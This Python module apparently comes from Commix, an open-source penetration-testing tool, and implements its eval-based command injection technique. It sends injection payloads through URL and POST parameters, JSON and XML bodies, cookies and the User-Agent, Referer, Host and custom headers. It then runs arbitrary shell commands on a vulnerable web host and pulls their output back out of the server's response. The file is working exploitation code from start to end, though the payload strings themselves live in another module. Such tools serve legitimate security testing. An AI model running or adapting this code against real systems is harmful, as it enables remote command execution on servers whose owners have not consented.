#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import json
import string
import random
from src.utils import menu
from src.utils import settings
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.results_based.techniques.eval_based import eb_payloads

"""
The dynamic code evaluation (aka eval-based) technique.
"""

"""
Check if target host is vulnerable.
"""
def injection_test(payload, http_request_method, url):

  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    #url = parameters.do_GET_check(url)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    target = url.replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Get the response of the request
    response = requests.get_request_response(request)

  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = _urllib.parse.unquote(parameter)
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
    # Define the POST data     
    if settings.IS_JSON:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
      try:
        data = checks.json_data(data)
      except ValueError:
        pass
    elif settings.IS_XML:
      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
    else:
      data = parameter.replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
  
    # Get the response of the request
    response = requests.get_request_response(request)

  return response, vuln_parameter

"""
Evaluate test results.
"""
def injection_test_results(response, TAG, randvcalc):
  if response == False:
    return False
  else:
    html_data = checks.page_encoding(response, action="decode")
    html_data = re.sub("\n", " ", html_data)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + " " + TAG + " " + TAG + " " , html_data)
    else:
      shell = re.findall(r"" + TAG + " " + str(randvcalc) + " " + TAG + " " + TAG + " " , html_data)
    return shell

"""
Check if target host is vulnerable. (Cookie-based injection)
"""
def cookie_injection_test(url, vuln_parameter, payload):
  return requests.cookie_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (User-Agent-based injection)
"""
def user_agent_injection_test(url, vuln_parameter, payload):
  return requests.user_agent_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Referer-based injection)
"""
def referer_injection_test(url, vuln_parameter, payload):
  return requests.referer_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Host-based injection)
"""
def host_injection_test(url, vuln_parameter, payload):
  return requests.host_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Custom header injection)
"""
def custom_header_injection_test(url, vuln_parameter, payload):
  return requests.custom_header_injection(url, vuln_parameter, payload)

"""
The main command injection exploitation.
"""
def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):

  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
    # Execute shell commands on vulnerable host.
    if alter_shell:
      payload = eb_payloads.cmd_execution_alter_shell(separator, TAG, cmd)
    else:
      payload = eb_payloads.cmd_execution(separator, TAG, cmd)

    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)
    # Fixation for specific payload.
    if ")%3B" + _urllib.parse.quote(")}") in payload:
      payload = payload.replace(")%3B" + _urllib.parse.quote(")}"), ")" + _urllib.parse.quote(")}"))

    # Whitespace fixation
    payload = payload.replace(" ", whitespace)

    # Perform payload modification
    payload = checks.perform_payload_modification(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Executing the '" + cmd + "' command. "
      sys.stdout.write(settings.print_debug_msg(debug_msg))
      sys.stdout.flush()
      sys.stdout.write("\n" + settings.print_payload(payload) + "\n")

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      response = cookie_injection_test(url, vuln_parameter, payload)

     # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      response = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      response = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined host with "INJECT_HERE" tag
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
      response = host_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      response = custom_header_injection_test(url, vuln_parameter, payload)

    else:
      # Check if defined method is GET (Default).
      if http_request_method == "GET":
        # Check if its not specified the 'INJECT_HERE' tag
        #url = parameters.do_GET_check(url)
        
        target = url.replace(settings.INJECT_TAG, payload)
        vuln_parameter = ''.join(vuln_parameter)
        request = _urllib.request.Request(target)
        
        # Check if defined extra headers.
        headers.do_check(request)  

        # Get the response of the request
        response = requests.get_request_response(request)
       
      else :
        # Check if defined method is POST.
        parameter = menu.options.data
        parameter = _urllib.parse.unquote(parameter)
        # Check if its not specified the 'INJECT_HERE' tag
        parameter = parameters.do_POST_check(parameter)
        parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
        # Define the POST data   
        if settings.IS_JSON:
          data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
          try:
            data = checks.json_data(data)
          except ValueError:
            pass
        elif settings.IS_XML:
          data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
        else:
          data = parameter.replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))
        
        # Check if defined extra headers.
        headers.do_check(request)

        # Get the response of the request
        response = requests.get_request_response(request)

    return response

  # Do the injection check
  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
  tries = 0
  while not response:
    if tries < (menu.options.failed_tries / 2):
      response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
      tries = tries + 1
    else:
      err_msg = "Something went wrong, the request has failed (" + str(tries) + ") times continuously."
      sys.stdout.write(settings.print_critical_msg(err_msg)+"\n")
      raise SystemExit()

  return response

"""
Command execution results.
"""
def injection_results(response, TAG, cmd):
  new_line = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
  # Grab execution results
  html_data = checks.page_encoding(response, action="decode")
  html_data = re.sub("\n", new_line, html_data)
  shell = re.findall(r"" + TAG + new_line + TAG + "(.*)" + TAG + new_line + TAG + "", html_data)
  try:
    shell = shell[0].replace(new_line, "\n").rstrip().lstrip()
  except IndexError:
    pass
  return shell

# eof